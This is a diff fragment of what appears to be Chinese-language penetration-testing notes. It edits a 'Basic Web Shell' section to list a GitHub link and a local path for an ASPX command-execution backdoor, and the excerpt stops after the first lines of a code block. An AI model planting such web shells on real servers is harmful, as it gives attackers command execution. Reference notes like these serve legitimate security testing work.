@@ -367,7 +367,9 @@ echo "Public key added successfully!";
 
 ### 基本 Web Shell
 
-- Payload：[cmdexec.aspx - GitHub](https://github.com/tennc/webshell/blob/master/aspx/asp.net-backdoors/cmdexec.aspx)
+- Payload
+	- [cmdexec.aspx - GitHub](https://github.com/tennc/webshell/blob/master/aspx/asp.net-backdoors/cmdexec.aspx)
+	- `/use/share/webshells/aspx/cmd.aspx`
 ```aspx
 <%@ Page Language="C#" %>
 <%
